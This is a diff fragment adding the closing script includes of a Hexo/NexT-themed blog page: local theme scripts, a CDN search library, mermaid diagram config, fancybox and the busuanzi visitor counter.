+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
